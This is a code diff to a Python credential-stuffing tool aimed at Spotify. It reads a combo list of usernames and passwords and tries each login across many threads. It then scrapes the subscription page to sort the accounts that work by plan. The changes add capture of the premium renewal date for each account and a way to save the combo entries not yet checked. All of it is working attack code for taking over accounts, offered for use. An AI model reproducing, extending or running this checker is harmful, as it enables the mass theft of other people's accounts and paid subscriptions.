@@ -1,4 +1,4 @@
-import sys,threading,time,socket
+import sys,threading,time,socket,re,os
 from tkinter.filedialog import askopenfilename
 from tkinter import Tk
 try:
@@ -25,14 +25,26 @@ SAVE_DATA_PORT=65534
 DO_NOT_PRINT = False
 
 
-def savedata(plan,data):
+def savedata(plan,data,renew_date=None):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.connect(("127.0.0.1",SAVE_DATA_PORT))
-    save_data = plan + ">>" + data
+    if renew_date:
+        save_data = plan + ">>" + data + ">>" + renew_date
+    else:
+        save_data = plan + ">>" + data + ">>"
     save_data = save_data.encode()
     sock.send(save_data)
     response = sock.recv(256)
     return
+
+
+def makeSaveDirectory():
+    if os.path.isdir("../"+FILE_NAME_PREFIX):
+        return False
+    else:
+        os.mkdir(FILE_NAME_PREFIX)
+        os.chdir(FILE_NAME_PREFIX)
+        return True
 
 
 
@@ -40,22 +52,29 @@ def savemanager():
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.bind(("127.0.0.1",SAVE_DATA_PORT))
     sock.listen()
-    FILE_HITS_FREE = FILE_NAME_PREFIX + "_FREE.txt"
-    FILE_HITS_PREMIUM = FILE_NAME_PREFIX + "_PREMIUM.txt"
-    FILE_HITS_OWNER = FILE_NAME_PREFIX + "_OWNER.txt"
-    FILE_HITS_MEMBER = FILE_NAME_PREFIX + "_MEMBER.txt"
-    FILE_HITS_UNK = FILE_NAME_PREFIX + "_UNK.txt"
+    FILE_HITS_FREE = "FREE.txt"
+    FILE_HITS_PREMIUM = "PREMIUM.txt"
+    FILE_HITS_OWNER = "OWNER.txt"
+    FILE_HITS_MEMBER = "MEMBER.txt"
+    FILE_HITS_UNK = "UNK.txt"
     while True:
         client , _ = sock.accept()
         data = client.recv(2048) #TODO implement fetch function
         data = data.decode()
-        plan , login_data = data.split(">>")
+        plan , login_data , renew_date = data.split(">>")
+        makeSaveDirectory()
         if plan == "free":
             temp_file = open(FILE_HITS_FREE,"a+")
             temp_file.write(login_data + "\n")
+        elif plan == "premium" and renew_date:
+            temp_file = open(FILE_HITS_PREMIUM,"a+")
+            temp_file.write(login_data + " | " + renew_date + "\n")
         elif plan == "premium":
             temp_file = open(FILE_HITS_PREMIUM,"a+")
             temp_file.write(login_data + "\n")
+        elif plan == "owner" and renew_date:
+            temp_file = open(FILE_HITS_OWNER,"a+")
+            temp_file.write(login_data + " | " + renew_date + "\n")
         elif plan == "owner":
             temp_file = open(FILE_HITS_OWNER,"a+")
             temp_file.write(login_data + "\n")
@@ -89,32 +108,33 @@ def check_account(username,password):
     except Exception as e:
         check_account(username,password)
 
-
-    if not resp:
+    try:
+        if resp.status_code==200:
+            return [0,session]
+        elif resp.status_code==400:
+            return [-1,None]
+        else:
+            return [-2,resp]
+    except UnboundLocalError:
+        print("rec")
         check_account(username,password)
-            #I've no clue why but sometimes we run the following
-            #lines and resp variable is not set yet. The previous
-            #condition is there to make sure that resp variable is
-            #set before calling it
-    if resp.status_code==200:
-        return [0,session]
-    elif resp.status_code==400:
-        return [-1,None]
-    else:
-        return [-2,resp]
 
 def check_info(login_session):
     resp = login_session.get("https://www.spotify.com/us/account/subscription/")
     if resp.text.count("Spotify Free"):
-        return "free"
-    elif resp.text.count("You're a member of a family plan"):
-        return "familyMember"
+        return ["free",None]
+    try:
+        renew_date = re.findall("\d{1,3}\/\d{1,3}\/\d{1,3}",resp.text)[0]
+    except:
+        renew_date = None
+    if resp.text.count("You're a member of a family plan"):
+        return ["familyMember",None]
     elif resp.text.count("Premium for Family"):
-        return "familyOwner"
+        return ["familyOwner",renew_date]
     elif resp.text.count("Spotify Premium"):
-        return "premium"
+        return ["premium",renew_date]
     else:
-        return resp
+        return [resp,None]
 
 def Intro():
     print("""
@@ -160,42 +180,39 @@ def divide_combo(combofile,num):
         pass
         #TODO find a method for loading large files
 
-def threadhandler(combo):
-    for data in combo:
+def threadhandler(comboID):
+    global combo
+    for data in combo[comboID]:
         user , password = data[:data.find(":")],data[data.find(":")+1:]  
         stat,session = check_account(user,password)
         if stat==-1:
             global BAD_COUNT 
             BAD_COUNT += 1
-            continue
         elif stat==0:
-            plan = check_info(session)
+            plan , renew_date = check_info(session)
             if "str" in str(type(plan)):
                 if plan=="free":
                     global GOOD_FREE
                     GOOD_FREE.append(data)
                     savedata("free",data)
-                    continue
                 elif plan=="premium":
                     global GOOD_PREMIUM
                     GOOD_PREMIUM.append(data)
-                    savedata("premium",data)
-                    continue
+                    savedata("premium",data,renew_date)
                 elif plan=="familyOwner":
                     global GOOD_FAMILY_OWNER
                     GOOD_FAMILY_OWNER.append(data)
-                    savedata("owner",data)
-                    continue
+                    savedata("owner",data,renew_date)
                 elif plan=="familyMember":
                     global GOOD_FAMILY_MEMBER
                     GOOD_FAMILY_MEMBER.append(data)
                     savedata("member",data)
-                    continue
                 else:
                     global UNK
                     UNK.append(data)
                     savedata("unk",data)
-                    continue
+        combo[comboID].remove(data)
+
                     
 
 def Board(refresh_rate=1/5):
@@ -219,15 +236,27 @@ if __name__=="__main__":
     threading._start_new_thread(savemanager,tuple())
     threading._start_new_thread(Board,tuple())
     for number in range(threads):
-        threading._start_new_thread(threadhandler,tuple([combo[number]]))
+        threading._start_new_thread(threadhandler,(number,))
     while True:
         try:
             pass
         except KeyboardInterrupt:
-            DO_NOT_PRINT = 1
-            if input("Exiting?(y/n)\t").lower()=="y":
+            DO_NOT_PRINT = True
+            command = input("Exit or Save progress?(y/n/s)\t")
+            if command.lower()=="y":
                 sys.exit()
+            elif command.lower()=="s":
+                makeSaveDirectory()
+                final_combo_file = open("FinalCombo.txt",'w')
+                final_combo = []
+                for subCombo in combo:
+                    final_combo += subCombo
+                for combination in final_combo:
+                    final_combo_file.write(combination)
+                final_combo_file.close()
+                sys.exit()
+                
             else:
-                DO_NOT_PRINT = 0
+                DO_NOT_PRINT = False
                 continue
 
